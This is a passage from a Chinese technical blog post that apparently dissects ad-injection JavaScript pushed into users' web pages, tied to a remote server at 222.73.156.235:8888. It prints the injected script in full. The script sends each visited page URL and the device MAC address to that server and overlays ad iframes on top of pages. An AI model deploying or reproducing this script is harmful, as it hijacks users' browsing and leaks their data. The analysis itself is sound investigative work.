class="title function_">selectNodeContents</span>(a);</span><br><span class="line">                b.<span class="title function_">removeAllRanges</span>();</span><br><span class="line">                b.<span class="title function_">addRange</span>(e);</span><br><span class="line">                a = b.<span class="title function_">toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>该JS会与<code>http://222.73.156.235:8888/v2?MAC=XXXXXXXXXXXX</code>一起作用弹广告，该网址内容为<br>MAC用于拼接下面的MAC地址（<code>deviceMac</code>）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ip = <span class="string">&#x27;http://222.73.156.235:8888&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> pc = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> android = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> ios = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> deviceMac = <span class="string">&#x27;XX:XX:XX:XX:XX:XX&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> statisticUrl = <span class="string">&#x27;http://222.73.156.235:8888/v2/router/ad/state&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> a_str = &#123;<span class="string">&quot;top&quot;</span>: &#123;&#125;,<span class="string">&quot;center&quot;</span>: &#123;&#125;,<span class="string">&quot;bottom&quot;</span>: &#123;&#125;&#125;;</span><br><span class="line">    <span class="keyword">var</span> hostUrl = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// var timestamp = new Date().getTime();</span></span><br><span class="line">    <span class="comment">// lalala</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">aa</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(e.<span class="property">data</span>.<span class="property">removeIframe</span> == <span class="string">&quot;yes&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(e.<span class="property">data</span>.<span class="property">iframeId</span>).<span class="title function_">remove</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;, <span class="literal">false</span>)</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//判断方向,resize的时候判断方向(adp-138)</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">          <span class="keyword">var</span> iframe_Ct_a = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;iframe_center_a&#x27;</span>);</span><br><span class="line">          <span class="keyword">var</span> iframe_Ct_b = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;iframe_bottom_a&#x27;</span>);</span><br><span class="line">          <span class="comment">//中间插屏</span></span><br><span class="line">          <span class="keyword">if</span>(iframe_Ct_a)&#123;</span><br><span class="line">             <span class="keyword">if</span>( <span class="variable language_">window</span>.<span class="property">orientation</span> == <span class="number">90</span> || <span class="variable language_">window</span>.<span class="property">orientation</span>==-<span class="number">90</span>)&#123;</span><br><span class="line">                  iframe_Ct_a.<span class="property">style</span>.<span class="property">left</span> = <span class="variable language_">window</span>.<span class="property">innerWidth</span> /<span class="number">2</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                  iframe_Ct_a.<span class="property">style</span>.<span class="property">top</span> = <span class="variable language_">window</span>.<span class="property">innerHeight</span>/<span class="number">1.2</span>+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">                  iframe_Ct_a.<span class="property">style</span>.<span class="property">marginLeft</span> = <span class="built_in">parseInt</span>(a_str.<span class="property">center</span>.<span class="property">width</span>)/<span class="number">2</span>*(-<span class="number">1</span>)+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">                  iframe_Ct_a.<span class="property">style</span>.<span class="property">marginTop</span> = (<span class="variable language_">window</span>.<span class="property">innerHeight</span>/<span class="number">1.5</span>)*(-<span class="number">1</span>)+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            <span class="keyword">if</span>( <span class="variable language_">window</span>.<span class="property">orientation</span> == <span class="number">180</span> || <span class="variable language_">window</span>.<span class="property">orientation</span> == <span class="number">0</span> ) &#123;</span><br><span class="line">               iframe_Ct_a.<span class="property">style</span>.<span class="property">left</span> = <span class="variable language_">window</span>.<span class="property">innerWidth</span> /<span class="number">2</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">               iframe_Ct_a.<span class="property">style</span>.<span class="property">top</span> = <span class="variable language_">window</span>.<span class="property">innerHeight</span> /<span class="number">2</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">               iframe_Ct_a.<span class="property">style</span>.<span class="property">marginLeft</span> = <span class="built_in">parseInt</span>(a_str.<span class="property">center</span>.<span class="property">width</span>)/<span class="number">2</span>*(-<span class="number">1</span>)+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">               iframe_Ct_a.<span class="property">style</span>.<span class="property">marginTop</span> = <span class="built_in">parseInt</span>(a_str.<span class="property">center</span>.<span class="property">height</span>)/<span class="number">2</span>*(-<span class="number">1</span>)+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">//底部横幅</span></span><br><span class="line">          <span class="keyword">if</span>(iframe_Ct_b)&#123;</span><br><span class="line">             <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">orientation</span> ==<span class="number">90</span> || <span class="variable language_">window</span>.<span class="property">orientation</span>==-<span class="number">90</span>)&#123;</span><br><span class="line">                iframe_Ct_b.<span class="property">style</span>.<span class="property">marginLeft</span> = <span class="string">&quot;25%&quot;</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">orientation</span> == <span class="number">180</span> || <span class="variable language_">window</span>.<span class="property">orientation</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                iframe_Ct_b.<span class="property">style</span>.<span class="property">marginLeft</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">aa</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//增加禁止域名判断</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">forbidHost</span>())&#123;</span><br><span class="line">            <span class="title function_">loadJs</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hostUrl = <span class="built_in">encodeURIComponent</span>(top.<span class="property">window</span>.<span class="property">location</span>.<span class="property">href</span>);</span><br><span class="line">        <span class="keyword">var</span> browser = &#123;</span><br><span class="line">            <span class="attr">versions</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> u = navigator.<span class="property">userAgent</span>, app = navigator.<span class="property">appVersion</span>;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">trident</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;Trident&#x27;</span>) &gt; -<span class="number">1</span>, <span class="comment">//IE内核</span></span><br><span class="line">                    <span class="attr">presto</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;Presto&#x27;</span>) &gt; -<span class="number">1</span>, <span class="comment">//opera内核</span></span><br><span class="line">                    <span class="attr">webKit</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;AppleWebKit&#x27;</span>) &gt; -<span class="number">1</span>, <span class="comment">//苹果、谷歌内核</span></span><br><span class="line">                    <span class="attr">gecko</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;Gecko&#x27;</span>) &gt; -<span class="number">1</span> &amp;&amp; u.<span class="title function_">indexOf</span>(<span class="string">&#x27;KHTML&#x27;</span>) == -<span class="number">1</span>, <span class="comment">//火狐内核</span></span><br><span class="line">                    <span class="attr">mac</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;Macintosh&#x27;</span>) &gt; -<span class="number">1</span>,<span class="comment">//mac</span></span><br><span class="line">                    <span class="attr">mobile</span>: !!u.<span class="title function_">match</span>(<span class="regexp">/AppleWebKit.*Mobile.*/</span>) || !!u.<span class="title function_">match</span>(<span class="regexp">/AppleWebKit/</span>), <span class="comment">//是否为移动终端</span></span><br><span class="line">                    <span class="attr">ios</span>: !!u.<span class="title function_">match</span>(<span class="regexp">/\(i[^;]+;( U;)? CPU.+Mac OS X/</span>), <span class="comment">//ios终端</span></span><br><span class="line">                    <span class="attr">android</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;Android&#x27;</span>) &gt; -<span class="number">1</span> || u.<span class="title function_">indexOf</span>(<span class="string">&#x27;Linux&#x27;</span>) &gt; -<span class="number">1</span>, <span class="comment">//android终端或者uc浏览器</span></span><br><span class="line">                    <span class="attr">iPhone</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;iPhone&#x27;</span>) &gt; -<span class="number">1</span> || u.<span class="title function_">indexOf</span>(<span class="string">&#x27;Mac&#x27;</span>) &gt; -<span class="number">1</span>, <span class="comment">//是否为iPhone或者QQHD浏览器</span></span><br><span class="line">                    <span class="attr">iPad</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;iPad&#x27;</span>) &gt; -<span class="number">1</span>, <span class="comment">//是否iPad</span></span><br><span class="line">                    <span class="attr">webApp</span>: u.<span class="title function_">indexOf</span>(<span class="string">&#x27;Safari&#x27;</span>) == -<span class="number">1</span> <span class="comment">//是否web应该程序，没有头部与底部</span></span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isWeiXin</span>() || <span class="title function_">isAPP</span>() || <span class="literal">true</span> == browser.<span class="property">versions</span>.<span class="property">mac</span>) &#123;</span><br><span class="line">    <span class="title function_">loadJs</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (browser.<span class="property">versions</span>.<span class="property">android</span> == <span class="literal">true</span>) &#123;  <span class="comment">//只投Android</span></span><br><span class="line">            <span class="keyword">if</span>(android)&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;ios append iframe.&quot;);</span></span><br><span class="line">                <span class="title function_">appendIframe</span>();</span><br><span class="line">                <span class="title function_">loadJs</span>();</span><br><span class="line">                <span class="comment">//console.log(&quot;ios append iframe over.&quot;);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (browser.<span class="property">versions</span>.<span class="property">ios</span> == <span class="literal">true</span> || browser.<span class="property">versions</span>.<span class="property">iPhone</span> == <span class="literal">true</span> || browser.<span class="property">versions</span>.<span class="property">iPad</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ios)&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;ios append iframe.&quot;);</span></span><br><span class="line">                <span class="title function_">appendIframe</span>();</span><br><span class="line"><span class="title function_">loadJs</span>();</span><br><span class="line">                <span class="comment">//console.log(&quot;ios append iframe over.&quot;)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">loadJs</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">appendIframe</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> dataSet = &#123;&#125;;</span><br><span class="line">            dataSet.<span class="property">deviceMac</span> = deviceMac;</span><br><span class="line">            dataSet.<span class="property">statisticUrl</span> = statisticUrl;</span><br><span class="line">            dataSet.<span class="property">hostUrl</span> = hostUrl;</span><br><span class="line">            dataSet.<span class="property">ip</span> = ip;</span><br><span class="line">            <span class="keyword">if</span>(a_str.<span class="property">top</span>.<span class="property">height</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> iframe_Tp = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">                iframe_Tp.<span class="property">src</span> = ip + <span class="string">&#x27;/routerad/common/pages/mobile_index.html&#x27;</span>;</span><br><span class="line">                iframe_Tp.<span class="property">id</span> = <span class="string">&quot;iframe_top_a&quot;</span>;</span><br><span class="line">                iframe_Tp.<span class="property">name</span> = <span class="string">&quot;iframe_top_a&quot;</span>;</span><br><span class="line">                iframe_Tp.<span class="property">scrolling</span> = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">                iframe_Tp.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">                iframe_Tp.<span class="property">style</span>.<span class="property">position</span>=<span class="string">&quot;fixed&quot;</span>;</span><br><span class="line">                iframe_Tp.<span class="title function_">setAttribute</span>(<span class="string">&quot;frameborder&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">                iframe_Tp.<span class="property">style</span>.<span class="property">zIndex</span> = <span class="string">&quot;2147483647&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> iframeWidth,iframeHeight;</span><br><span class="line">                iframeWidth = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line">                iframeHeight = <span class="built_in">parseInt</span>(a_str.<span class="property">top</span>.<span class="property">height</span>) * <span class="built_in">parseInt</span>(iframeWidth)/<span class="built_in">parseInt</span>(a_str.<span class="property">top</span>.<span class="property">width</span>);</span><br><span class="line"></span><br><span class="line">                iframe_Tp.<span class="property">style</span>.<span class="property">width</span> = iframeWidth + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                iframe_Tp.<span class="property">style</span>.<span class="property">height</span> =  iframeHeight + <span class="string">&quot;px&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//iframe_Bt.style.bottom = &quot;0px&quot;;</span></span><br><span class="line">                iframe_Bt.<span class="property">style</span>.<span class="property">top</span> = <span class="string">&quot;0px&quot;</span>;</span><br><span class="line">                iframe_Tp.<span class="property">style</span>.<span class="property">left</span> = <span class="string">&quot;0px&quot;</span>;</span><br><span class="line">                <span class="variable language_">window</span>.<span class="property">top</span>.<span class="property">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe_Tp);</span><br><span class="line">                dataSet.<span class="property">picList</span> = a_str.<span class="property">top</span>.<span class="property">picList</span>;</span><br><span class="line">                dataSet.<span class="property">iframeId</span> = <span class="string">&quot;iframe_top_a&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;iframe_top_a&#x27;</span>).<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> ifr = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#iframe_top_a&#x27;</span>);</span><br><span class="line">                    ifr.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(dataSet, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(a_str.<span class="property">bottom</span>.<span class="property">height</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;bottom iframe.&quot;);</span></span><br><span class="line">                <span class="keyword">var</span> iframe_Bt = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">                iframe_Bt.<span class="property">src</span> = ip + <span class="string">&#x27;/routerad/common/pages/mobile_index.html&#x27;</span>;</span><br><span class="line">                iframe_Bt.<span class="property">id</span> = <span class="string">&quot;iframe_bottom_a&quot;</span>;</span><br><span class="line">                iframe_Bt.<span class="property">name</span> = <span class="string">&quot;iframe_bottom_a&quot;</span>;</span><br><span class="line">                iframe_Bt.<span class="property">scrolling</span> = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">                iframe_Bt.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">                iframe_Bt.<span class="property">style</span>.<span class="property">position</span>=<span class="string">&quot;fixed&quot;</span>;</span><br><span class="line">                iframe_Bt.<span class="title function_">setAttribute</span>(<span class="string">&quot;frameborder&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">                iframe_Bt.<span class="property">style</span>.<span class="property">zIndex</span> = <span class="string">&quot;2147483647&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> iframeWidth,iframeHeight;</span><br><span class="line">                iframeWidth = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line">                iframeHeight = <span class="built_in">parseInt</span>(a_str.<span class="property">bottom</span>.<span class="property">height</span>) * <span class="built_in">parseInt</span>(iframeWidth)/<span class="built_in">parseInt</span>(a_str.<span class="property">bottom</span>.<span class="property">width</span>);</span><br><span class="line"></span><br><span class="line">                iframe_Bt.<span class="property">style</span>.<span class="property">width</span> = iframeWidth + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                iframe_Bt.<span class="property">style</span>.<span class="property">height</span> =  iframeHeight + <span class="string">&quot;px&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//iframe_Bt.style.top = window.innerHeight + &quot;px&quot;;</span></span><br><span class="line">                iframe_Bt.<span class="property">style</span>.<span class="property">bottom</span> = <span class="string">&quot;0px&quot;</span>;</span><br><span class="line">                iframe_Bt.<span class="property">style</span>.<span class="property">left</span> = <span class="string">&quot;0px&quot;</span>;</span><br><span class="line">                iframe_Bt.<span class="property">style</span>.<span class="property">marginTop</span> = iframeHeight*(-<span class="number">1</span>) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">window</span>.<span class="property">top</span>.<span class="property">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe_Bt);</span><br><span class="line">                dataSet.<span class="property">picList</span> = a_str.<span class="property">bottom</span>.<span class="property">picList</span>;</span><br><span class="line">                dataSet.<span class="property">iframeId</span> = <span class="string">&quot;iframe_bottom_a&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;iframe_bottom_a&#x27;</span>).<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> ifr = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#iframe_bottom_a&#x27;</span>);</span><br><span class="line">                    ifr.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(dataSet, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(a_str.<span class="property">center</span>.<span class="property">height</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;center iframe.&quot;);</span></span><br><span class="line">                <span class="keyword">var</span> iframe_Ct = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">                iframe_Ct.<span class="property">src</span> = ip + <span class="string">&#x27;/routerad/common/pages/mobile_index.html&#x27;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">id</span> = <span class="string">&quot;iframe_center_a&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">name</span> = <span class="string">&quot;iframe_center_a&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">scrolling</span> = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">style</span>.<span class="property">position</span>=<span class="string">&quot;fixed&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="title function_">setAttribute</span>(<span class="string">&quot;frameborder&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">                iframe_Ct.<span class="property">style</span>.<span class="property">zIndex</span> = <span class="string">&quot;2147483647&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> iframeWidth,iframeHeight;</span><br><span class="line">                iframeWidth = a_str.<span class="property">center</span>.<span class="property">width</span>;</span><br><span class="line">                iframeHeight = a_str.<span class="property">center</span>.<span class="property">height</span>;</span><br><span class="line"></span><br><span class="line">                iframe_Ct.<span class="property">style</span>.<span class="property">width</span> = <span class="built_in">parseInt</span>(iframeWidth) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">style</span>.<span class="property">height</span> =  <span class="built_in">parseInt</span>(iframeHeight) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">style</span>.<span class="property">left</span> = <span class="variable language_">window</span>.<span class="property">innerWidth</span> /<span class="number">2</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">style</span>.<span class="property">top</span> = <span class="variable language_">window</span>.<span class="property">innerHeight</span> /<span class="number">2</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">style</span>.<span class="property">marginLeft</span> = <span class="built_in">parseInt</span>(iframeWidth)/<span class="number">2</span>*(-<span class="number">1</span>)+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">                iframe_Ct.<span class="property">style</span>.<span class="property">marginTop</span> = <span class="built_in">parseInt</span>(iframeHeight)/<span class="number">2</span>*(-<span class="number">1</span>)+<span class="string">&quot;px&quot;</span>;</span><br><span class="line">                <span class="variable language_">window</span>.<span class="property">top</span>.<span class="property">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe_Ct);</span><br><span class="line"></span><br><span class="line">                dataSet.<span class="property">picList</span> = a_str.<span class="property">center</span>.<span class="property">picList</span>;</span><br><span class="line">                dataSet.<span class="property">iframeId</span> = <span class="string">&quot;iframe_center_a&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;iframe_center_a&#x27;</span>).<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> ifr = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#iframe_center_a&#x27;</span>);</span><br><span class="line">                    ifr.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(dataSet, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isWeiXin</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ua = <span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">userAgent</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line">        <span class="comment">//console.log(ua);//mozilla/5.0 (iphone; cpu iphone os 9_1 like mac os x) applewebkit/601.1.46 (khtml, like gecko)version/9.0 mobile/13b143 safari/601.1</span></span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">match</span>(<span class="regexp">/MicroMessenger/i</span>) == <span class="string">&#x27;micromessenger&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isAPP</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ua = <span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">userAgent</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;biliapp&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;wifikey&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;newsarticle&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;peanutwi-fi&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;phiwifi&quot;</span>)&gt;=<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;changba&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;phicare&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;vmchybirdapp-android&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;vmchybirdapp-ios&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.<span class="title function_">indexOf</span>(<span class="string">&quot;momowebview&quot;</span>) &gt;= <span class="number">0</span> || ua.<span class="title function_">indexOf</span>(<span class="string">&quot;momokit&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//禁止显示广告的域名，后续增加多个时候可以使用数组</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">forbidHost</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> url = top.<span class="property">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span><br><span class="line">        <span class="keyword">var</span> host = top.<span class="property">window</span>.<span class="property">location</span>.<span class="property">host</span>;</span><br><span class="line">        <span class="keyword">if</span> (host.<span class="title function_">indexOf</span>(<span class="string">&quot;.gov.cn&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">var</span> forbidHostArray = [<span class="string">&quot;www.xinhuanet.com&quot;</span>, <span class="string">&quot;.eastday.com&quot;</span>, <span class="string">&quot;china.com.cn&quot;</span>, <span class="string">&quot;www.chinadaily.com.cn&quot;</span>, <span class="string">&quot;.caijing.com.cn&quot;</span>, <span class="string">&quot;.huanqiu.com&quot;</span>, <span class="string">&quot;.youku.com&quot;</span>, <span class="string">&quot;.youth.cn&quot;</span>, <span class="string">&quot;.people.com.cn&quot;</span>, <span class="string">&quot;www.wangxin.name&quot;</span>, <span class="string">&quot;wjwcoin.pro&quot;</span>, <span class="string">&quot;www.wkj.link&quot;</span>, <span class="string">&quot;www.bid-buy.pro&quot;</span>, <span class="string">&quot;www.daywin.pro&quot;</span>, <span class="string">&quot;www.7650.biz&quot;</span>];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; forbidHostArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (host.<span class="title function_">indexOf</span>(forbidHostArray[i]) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> reg = <span class="regexp">/phicomm\.com/g</span>;</span><br><span class="line">        <span class="keyword">var</span> 